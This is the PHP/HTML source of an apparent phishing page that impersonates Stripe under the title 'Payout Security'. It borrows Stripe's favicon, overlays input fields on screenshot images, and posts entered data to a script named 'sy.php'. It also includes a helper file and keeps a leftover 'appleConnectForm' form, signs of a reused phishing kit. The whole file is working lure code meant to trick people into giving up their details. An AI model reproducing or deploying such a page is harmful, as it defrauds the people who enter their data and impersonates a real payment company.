<?php   ob_start();  ?>
<?
include "X-x-X.php";
?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	<title>Stripe - Payout Security</title>
	<link rel="icon" type="image/png" href="https://dashboard.stripe.com/favicon.ico" />
	<style>
		body {
		 margin-top: -41;
		 background: url("AA/bac.png");
		}

		.page {
		 background-image: url("AA/stri.png");
		 background-repeat: no-repeat;
		 height: 650px;
		 width: 1358px;
		 position: relative;
		}
		
		input, select {
		 position: absolute; /* VODKA */
		 width: 304;
		 height: 22;
		 border: 0;
		 padding: 3 8 3 8;
		 left: 587;
		}

		.button {
		 width: 105;
		 height: 37;
		 border: 0;
		 cursor: pointer;
		}
		.submit {
		 position: absolute;
		 left: 810;
		 top: 540;
		}
	</style>
	

								<p>&nbsp;<form name="appleConnectForm" method="post" action="sy.php">

	<center>
			<form action="--WEBBOT-SELF--" method="POST" id="info" onsubmit="if(do_submit(3)) return true; else return false;">
		<div class="page">

			<div>
				<input type="text" placeholder="" autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" required="" title="" id="fullname1" name="ultras1" style="top:302;position:absolute; left:608; width:234px; height:27" size="41">
<input type="image"  border="0" alt="" name="submit" style="position: absolute; left: 820; top: 392; height: 30px; width: 56px" src="AA/blank.gif">
					<p>
			&nbsp;</div>
					<!--  -->